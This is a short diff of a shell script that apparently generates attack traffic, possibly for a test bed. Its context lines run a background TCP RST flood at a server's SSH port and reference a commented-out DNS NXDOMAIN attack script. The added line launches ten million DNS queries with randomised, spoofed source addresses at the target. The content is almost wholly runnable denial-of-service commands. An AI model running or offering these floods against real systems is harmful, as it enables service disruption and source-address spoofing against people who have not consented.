@@ -52,6 +52,9 @@ echo "Performing a RST Flood on TCP towards SSH \r\n "
 sudo nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT 2> /dev/null &
 #-----------------------------------------------------------------------------------------------------------------
 
+mz -A rand -B $server_ip -t dns "q=badactor.com" -c 10000000 2> /dev/null &
+
+
 #------ Attack traffic ----------
 #echo "Running NX Domain attack python script... \r\n "
 #sudo python attack_dns_nxdomain.py $server_ip example.com 10000 &>/dev/null &
